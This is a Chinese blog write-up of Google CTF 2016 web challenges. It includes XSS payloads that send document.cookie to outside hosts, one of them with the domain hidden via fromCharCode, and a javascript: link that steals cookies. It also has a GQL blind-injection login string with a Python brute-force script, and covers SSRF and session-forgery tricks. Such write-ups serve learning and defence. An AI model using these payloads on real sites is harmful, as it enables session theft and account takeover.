title: google_ctf2016_writeup
date: 2016-05-02 13:01:12
tags:
- Blogs
- ctf
categories:
- Blogs
---

5月不减肥，6月徒悲伤...（╯－＿－）╯╧╧，5月的第一个周末就哪也没去，打了google第一年办的比赛，整体还可以，就是月到了很多奇怪的东西。。。也不知道是我们脑洞太小了，还是说google的程序员什么洞都写过。。。

<!--more-->

# WEB

## Wallowing Wallabies
题目是一个系列的xss题目，有趣的是，最开始刚刚开始的时候，这个题目不是这样的...好像是把另一题的环境搭了过来，结果开始就误导了很多。

[https://wallowing-wallabies.ctfcompetition.com/](https://wallowing-wallabies.ctfcompetition.com/)

首先是发现有robots.txt

```
User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters    HTTP:402
Disallow: /deep-blue-sea/team/paragraphs  HTTP:403
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors
```
首先发现只有最后一个能打开，然后题目提示说要xss盗cookie，打开发现是个给管理员的留言板，那么就知道了，开始吧。

### Part One
第一题的xss真的是比较扯淡，题目要求必须要有
```
<script src
```
这样的开头。。。还没见过这样的要求，因为站中开启了CSP，所以，这里是不能用外联js的，没关系，那就再后面再加一个script标签吧，测试下好像发现管理员不能和外部通信，那么久粗暴的使用了跳转...

```
<script src="/js/jquery-1.12.0.min.js"></script><script>window.location="http://xss.xxxx.cc?+cookie"+document.cookie</script>
```
打到了cookie，但是花了很久才找到flag，没办法...题意说不清楚...
```
green-mountains=eyJub25jZSI6IjA4ZjVhNzgxZWY3MTdjMjMiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MTk5NTc1OX0=|1461995756|4feab5409a0f36bd685bc17473cc363699790e36
```
前面解base64得到
`'{"nonce":"08f5a781ef717c23","allowed":"^/deep-blue-sea/team/vendors.*$","expiry":1461995759}'`
我们看到vendors域下得到了allowed，加上cookie查看这个页面我们的到flag，还得到了下一题的入口。

### Part Two
[https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/vendors/msg](https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/vendors/msg)

还是留言板，那么就试验下吧，稍微测试下发现好像是/后会被过滤，alert会被过滤，如果on属性后面有=号会被过滤。
由于/后被过滤，所以没办法闭合`<script>`,试了一下解决不了，那么久换标签吧...

```
<svg/onload
="
window.location='http://xss.xxx.cc?'+(document.cookie)">
```
这里也是踩了大坑，不知道为什么，这里的boot一直挂，导致很久才收到cookie，但是却没注意到cookie有区别，等了4、5个小时才发现这个问题。
```
green-mountains=eyJub25jZSI6ImUxZTM5ZjcxZTBkNTVjMDQiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MjAxNDM5MX0=|1462014388|0b51ee8a5986850cf11b119a6ddd447b277dc8e1
```
解下base64
`'{"nonce":"e1e39f71e0d55c04","allowed":"^/deep-blue-sea/team/characters.*$","expiry":1462014391}'`
我们看到给了另一个域下的权限。访问character得到另一个flag

### Part Three

虽然不知道为什么第三题给了很高的分数，不过真的是花了几分钟就做出来了。。。

测试下发现title过滤比较弱，只发现一个过滤，就是.的过滤，首先是解决域名的问题。

用`String['fromCharCode'](120, 115, 115, 46, 108, 97, 122, 121, 115, 104, 101, 101, 112, 46, 99, 99)`就可以得到域名，其次是document.cookie的问题，ak菊苣告诉我，ducument可以当作一个数组处理，也就是`document['cookie']`这样的可以得到cookie

payload
```
<script>location='http:///'+String['fromCharCode'](120, 115, 115, 46, 108, 97, 122, 121, 115, 104, 101, 101, 112, 46, 99, 99)+'/?'+document['cookie'];</script>

green-mountains=eyJub25jZSI6IjkyYmIyZWE5OWYwNTdiZDgiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vcGFyYWdyYXBoLiokIiwiZXhwaXJ5IjoxNDYyMDE5MjAxfQ==|1462019198|287dbcc084c610e2666ac995616137577bc4c05b

```

## Ernst Echidna

没啥可以说的，注册发现cookie是用户名的MD5，那么改个admin的MD5就好了

## Spotted Quoll

题目是python的序列化和反序列化
他给的解开后发现user那里是None，所以补上一个admin，get

## Purple Wombats

打开发现有源码泄露，然而最扯的事，这个提示最开始是在那个xss那题里的

源码地址：[https://github.com/mannequin-moments/website](https://github.com/mannequin-moments/website)

但是登陆功能被关闭了，然而打开flag页面却有检测是否登陆的装饰器
```
def require_login(f):
    @functools.wraps(f)
    def wrapped(self, *args, **kwargs):
        if not self.session.get('user'):
            return webapp2.redirect('/login', response=self.response)
        return f(self, *args, **kwargs)
    return wrapped

```
只检查了session中是存在username，并且给了secret_key，本地搭建webapp2的环境，在session中写个user，然后把session贴回线上环境

get!

## Dancing Dingoes

题目给了一个站，给了用户名和密码，要得到admin权限，我们找了很久都没找到，后来发现登陆有个login？domain=xxx这样的，改改发现报错了。打开看看发现用户信息是从这里获得的，那么我们在自己服务器上放一个，
`userid : admin`,然后请求这里，getflag
## Horton Hears a Who!
打开发现有登陆注册注销。

测试了很久发现token根本就是解不出的
```
dd1g:0:1462086430:MI80yZoF-STfaLEp1v124i2lsquULujTJJtM61Ug2tU=	
ddog:0:1462086430:O3S-RHZ7dobbKnZ_MfpSKhUf-PqirpPr852fuQ4MZ9A=

de1g:0:1462086550:AD8-7rek9ltrhb8_iLuAQ3rEvsQG0akf7LUfJOxWCRo=
deog:0:1462086550:MucH660HSiXby0hKYzXo4a0YmNtZs_c2EQnsOky1d84=	

ddog:0:1462086643:v98x98PtHScKlSyjHOlIhrqb8QIzBJ_Ljd1Cybp2V_M=
dd1g:0:1462086643:iB5EBvvZ9GbZv1rl4_XeUwhCf6xf7YRe9NNDmt0zpeE=
```
然后就弃疗了，后来结束看wp才知道。。这题根本不是这么做的（写出这种洞的程序员简直。。。）

注册一个名为`admin:1:没过期的时间戳`这样的username，然后解包的时候并不是完全想不通怎么回事就解成了admin...
`admin:1:1462168888:0:1462168809:z7AtZXC4yJDtfiAihcQBFbGHyasFaiRZQJC3rvqtwo0=`

然而并不能想通为什么我当时构造`admin:1:时间戳:token`就不能过判断(后来学长告诉我，是根据-1匹配token，然后和哈希的前面比较，然后才有这样的洞...)

Congratulations, your flag is: CTF{huh-i-didn't-know-you-could-do-that}

## Flag Storage Service

打开看看robots.txt
得到
```
User-agent: hackers
Disallow: /README.txt
Disallow: /sync


FlagService 0.01

README.txt

== Authentication ==
Authentication via username/password is the default.  If another authentication
mechanism is configured, then the password field must *not* be sent to avoid
including it in the backend query. The default username is 'manager', but this
may be customized to suit your needs.


== Synchronization ==
In order to sync between multiple instances, there is a config page at
/sync that is only available to authorized applications that send the
appropriate X-FlagStore header.  This header is automatically added
to all HTTP requests to partner instances.

```
看到wp
[http://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service/](http://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service/)

你tm告诉我，发现这题是前面一题的源码？？？这能看得出来？？？

测试了下发现存在gql注入，但是gql没有or语句，所以开始没有想出来怎么做。

```
@classmethod
def Login(cls, username, password):
    query = "SELECT * FROM User WHERE username = '%s'" % username
    if password is not None:
        query += " AND password = '%s'" % password
```

wp的作者说花了很久去看gql的文档[https://cloud.google.com/appengine/docs/python/datastore/gqlreference](https://cloud.google.com/appengine/docs/python/datastore/gqlreference)

然后还找到了一个有趣的东西
[http://stackoverflow.com/questions/47786/google-app-engine-is-it-possible-to-do-a-gql-like-query](http://stackoverflow.com/questions/47786/google-app-engine-is-it-possible-to-do-a-gql-like-query)

得到一个盲注的可能
```
username=manager’ AND password >=’A’ AND password < ‘Z
```
如果发这样的请求，得到`“Invalid password.” (error 1)`
测试到‘D’的时候发现报错变了
```
When we hit “D” we land on a different error: “Invalid username/password.” (error 2)
```
有个脚本
```
import random
import string
import pycurl
from io import BytesIO
import base64
import threading

def login(char):
    global password
    buffer = BytesIO()
    host_url = 'https://next-bitter-flag.ctfcompetition.com/login'
    c = pycurl.Curl()
    c.setopt(c.URL, host_url)
    c.setopt(pycurl.FOLLOWLOCATION, 1)
    c.setopt(pycurl.SSL_VERIFYPEER, 0);
    c.setopt(pycurl.COOKIEJAR, 'cookie.txt')
    c.setopt(pycurl.COOKIEFILE, 'cookie.txt')
    c.setopt(pycurl.POST, 1)
    c.setopt(pycurl.POSTFIELDS, "username=manager' AND password >='"+password+""+char+"' AND password < 'z")
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    c.close()
    body = buffer.getvalue()
    return body

password = "C"

def getNextChar():
    char_min=33
    char_max=126

    for x in range(char_min, char_max):
        char = chr(x)
        body = login(char)
        if "Invalid username/password." in body:
            return chr((x-1))
    return False
        
while True:
    password+=getNextChar()
    print(password)

print "end"
```

## FSS – Electric Boogaloo

[http://buer.haus/2016/05/01/google-ctf-web-12-fss-electric-boogaloo/](http://buer.haus/2016/05/01/google-ctf-web-12-fss-electric-boogaloo/)

这是上一题flag storage的下一题，用第一题得到的用户名密码登陆

我们发现无法访问/sync页面，可能是因为没有一个有效的头`X-FlagStore`

登陆后发现profile可能存在一些问题。
原文是这么说的
```
There’s a form for uploading GnuPG keys based on a remote URL. The immediate thing that jumps to mind is Server-Side Request Forgery. I tried to put my own website in this input and sure enough, it loaded the contents of my website and displayed it back. I put the /sync endpoint into the input and got the following:
```
GnuPG keys存在问题，他会读取所请求的源码，那么我们让他去读/sync,get flag

## Weedy Sea Dragon

题目说
**It's feared that their authentication and authorization check is implemented wrongly.**

打开网页会自动用 Google 帐号登录，然后告诉你你没有权限访问。

提示：
**Access to this service is restricted to @ctfcompetition.com accounts only.**
**Access from gmail.com accounts is prohibited**

大概意思就是需要从ctfcompetiion.com来源才能看到
这后面是看了这个人的wp[http://blog.eqoe.cn/posts/google-ctf-2016-part2.html](http://blog.eqoe.cn/posts/google-ctf-2016-part2.html)

猜测判断邮件地址是通过包含而不是写死的，那么
**我们打开域名管理，新增一个 ctfcompetition.com.yourdomain 的 MX 记录，在服务器上监听 25 端口。**

用 ctfcompetition.com@ctfcompetition.com.yourdomain 注册一个新的 Google 帐号，然后再登录目标页面，即可获得 Flag。

....

## Global CTF

描述
**Can you break into this CTF website? Features Two Factor Authentication for unbeatable security.**

这里是看了这篇wp，自己并没有做出来...
[http://buer.haus/2016/05/01/google-ctf-web-8-global-ctf/](http://buer.haus/2016/05/01/google-ctf-web-8-global-ctf/)

有趣的是，这题真的是一个ctf平台[https://github.com/Nakiami/mellivora](https://github.com/Nakiami/mellivora)
也就是说才google的题目里又有一个ctf平台

按照作者的意思，他在本地搭建了一个平台，一个页面一个页面的找，但是并没有找到什么问题（和我们一样）
但是...
**Nothing interesting. So I move on and eventually click on my Profile page.**

**I’m all of a sudden logged in as the admin and there is the flag:**

...
他测试后发现如果你用/recruit这里的请求改变你的用户session，你就可以登陆上不同的用户...

```
I created a new account and walked through the steps again to verify. Indeed, any time you use the /recruit request you change your current user session logging you into a different account.

I’ll have to revisit this later because it doesn’t seem like the intended solution or I missed something obvious.

```
...好吧...

## Geokitties

**Blast from the past. Prepare to enter a world of early 90's HTML, complete with background music. Visit GeoKitties today!**

题目没看，不过找到一个wp，说
```
'post_id=1&comment=<a href="javascript:location=\'http://domain/\'%2bdocument.cookie" onclick="">'
```

# networking
这次google遇到了一类没见过的题目，叫networking，队里没人会做。。。贴上大神的wp，以后学习

[http://blog.eqoe.cn/posts/google-ctf-2016-part1.html](http://blog.eqoe.cn/posts/google-ctf-2016-part1.html)